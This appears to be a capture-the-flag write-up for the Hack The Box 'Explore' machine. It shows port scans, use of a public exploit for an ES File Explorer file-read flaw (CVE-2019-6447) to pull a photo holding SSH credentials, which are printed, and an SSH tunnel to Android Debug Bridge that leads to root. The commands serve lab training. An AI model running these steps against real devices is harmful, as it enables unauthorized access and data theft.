# [explore](https://app.hackthebox.eu/machines/Explore)

> An Android system that has an arbitrary file read vulnerability which can be exploited to read a photo that contains user SSH credentials. The system is also serving the Android Debug Bridge on port 5555.

---

## Open Port Discovery

```bash
$ masscan -p1-65535 10.10.10.247 --rate=1000 -e tun0 --output-format grepable --output-filename explore.masscan
$ cat explore.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
2222,39673,42135,59777,
```

---

## Open Port Enumeration

```bash
$ nmap -sC -sV -O -p2222,39673,42135,59777 10.10.10.247 -oA explore
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 18:36 UTC
Nmap scan report for ip-10-10-10-247.us-east-2.compute.internal (10.10.10.247)
Host is up (0.019s latency).

PORT      STATE SERVICE VERSION
2222/tcp  open  ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey:
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
39673/tcp open  unknown
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.0 400 Bad Request
|     Date: Wed, 15 Sep 2021 18:36:10 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest:
|     HTTP/1.1 412 Precondition Failed
|     Date: Wed, 15 Sep 2021 18:36:10 GMT
|     Content-Length: 0
|   HTTPOptions:
|     HTTP/1.0 501 Not Implemented
|     Date: Wed, 15 Sep 2021 18:36:15 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help:                           
|     HTTP/1.0 400 Bad Request                                   
|     Date: Wed, 15 Sep 2021 18:36:30 GMT                                        
|     Content-Length: 26                                       
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest:
|     HTTP/1.0 400 Bad Request
|     Date: Wed, 15 Sep 2021 18:36:15 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Wed, 15 Sep 2021 18:36:30 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Wed, 15 Sep 2021 18:36:30 GMT                      
|     Content-Length: 71                        
|     Content-Type: text/plain; charset=US-ASCII                       
|     Connection: Close                       
|     Invalid request line:
|     ??random1random2random3random4
|   TerminalServerCookie:
|     HTTP/1.0 400 Bad Request
|     Date: Wed, 15 Sep 2021 18:36:30 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
42135/tcp open  http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=9/15%Time=61423D1C%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port39673-TCP:V=7.91%I=7%D=9/15%Time=61423D1B%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Wed,\x20
SF:15\x20Sep\x202021\x2018:36:10\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Wed,\x2015\x20Sep\x202021\x2018:3
SF:6:10\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Wed,\x2015\x20Sep\x202021\x
SF:2018:36:15\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Wed,\x2015\x20Sep\x202021\x2018:36:15\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Wed,\x2015\x20Sep\x202021\x2018:36:30\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq
SF:,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Wed,\x2015\x20Sep\x
SF:202021\x2018:36:30\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSe
SF:rverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Wed,\x201
SF:5\x20Sep\x202021\x2018:36:30\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Wed,\x2015\x20Sep\x202021\x2018:36:30\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Sony X75CH-series Android TV (Android 5.0) (94%), Linux 3.8 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Android 4.1 - 6.0 (Linux 3.4 - 3.14) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.0 - 7.0 (Linux 3.4 - 3.10) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Device: phone

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.67 seconds
```

---

## Arbitrary File Read Vulnerability to User

ES File Explorer 4.1.9.7.4 has an arbitrary file read vulnerability. Use this [exploit](https://www.exploit-db.com/exploits/50070) to list photos on the device.

```bash
$ python3 50070.py listPics 10.10.10.247
==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)
```

Retrieve `creds.jpg`.

```bash
$ python3 50070.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg
==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.
```

![creds.jpg](images/creds.jpg)

This reveals the credentials `kristi:Kr1sT!5h@Rp3xPl0r3!`. Use these credentials to access the target via SSH on port 2222.

```bash
$ ssh kristi@10.10.10.247 -p 2222
Password authentication
Password: 
:/ $ id
uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768
```

The photo was found at `/storage/emulated/0/DCIM`. Navigate to this directory to find `user.txt`.

---

## Privilege Escalation

### Enumeration

List all listening ports on the target device.

```bash
$ netstat -an | grep LISTEN                               
tcp6       0      0 ::ffff:127.0.0.1:46219  :::*                    LISTEN     
tcp6       0      0 :::2222                 :::*                    LISTEN     
tcp6       0      0 :::5555                 :::*                    LISTEN     
tcp6       0      0 :::42135                :::*                    LISTEN     
tcp6       0      0 ::ffff:10.10.10.2:39805 :::*                    LISTEN     
tcp6       0      0 :::59777                :::*                    LISTEN     
unix  2      [ ACC ]     STREAM     LISTENING         5908 /dev/socket/zygote_secondary
unix  2      [ ACC ]     SEQPACKET  LISTENING         5942 /dev/socket/lmkd
unix  2      [ ACC ]     STREAM     LISTENING         5961 /dev/socket/netd
unix  2      [ ACC ]     STREAM     LISTENING         5966 /dev/socket/dnsproxyd
unix  2      [ ACC ]     STREAM     LISTENING         5969 /dev/socket/mdns
unix  2      [ ACC ]     STREAM     LISTENING         5972 /dev/socket/fwmarkd
unix  2      [ ACC ]     STREAM     LISTENING        25216 @com.android.internal.os.WebViewZygoteInit/6d6e0300-df67-4e12-b6aa-7895a54bd50f
unix  2      [ ACC ]     STREAM     LISTENING        26039 /data/system/ndebugsocket
unix  2      [ ACC ]     SEQPACKET  LISTENING         7568 /dev/socket/tombstoned_crash
unix  2      [ ACC ]     STREAM     LISTENING         3982 /dev/socket/property_service
unix  2      [ ACC ]     SEQPACKET  LISTENING         7573 /dev/socket/tombstoned_intercept
unix  2      [ ACC ]     SEQPACKET  LISTENING         7576 /dev/socket/tombstoned_java_trace
unix  2      [ ACC ]     STREAM     LISTENING         8399 @SUPERUSER@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
unix  2      [ ACC ]     STREAM     LISTENING         9387 /dev/socket/mdnsd
unix  2      [ ACC ]     STREAM     LISTENING         6063 /dev/socket/adbd
unix  2      [ ACC ]     STREAM     LISTENING       933296 @webview_devtools_remote_27620
unix  2      [ ACC ]     STREAM     LISTENING         4572 /dev/socket/logd
unix  2      [ ACC ]     SEQPACKET  LISTENING         8605 @jdwp-control
unix  2      [ ACC ]     SEQPACKET  LISTENING         4577 /dev/socket/logdr
unix  2      [ ACC ]     STREAM     LISTENING       933331 @/data/user/0/com.estrongs.android.pop/files/comm/tool_port
unix  2      [ ACC ]     STREAM     LISTENING         7402 /dev/socket/zygote
```

The target device is listening on TCP port 5555, which is generally the Android Debug Bridge (ADB) server. If it is possible to connect to this port, remote command execution will also be possible.

### Exploitation

Though the target is listening on port 5555 on all interfaces, it is not possible to connect to port 5555 remotely using `adb`. Use `kristi`'s credentials to create an SSH tunnel from the attacker's port 5555 to the target's `localhost:5555`.

```bash
$ ssh kristi@10.10.10.247 -p 2222 -L 5555:127.0.0.1:5555
Password authentication
Password: 
:/ $
```

Connect to the ADB server.

```bash
$ adb connect 127.0.0.1:5555         
connected to 127.0.0.1:5555
$ adb devices               
List of devices attached
127.0.0.1:5555  device
```

Initiate the ADB shell and use `su` to escalate to `root`.

```bash
$ adb shell
x86_64:/ $ id
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u
:r:shell:s0
$ su
$ whoami
root
```

Retrieve the system flag at `/data/root.txt`.
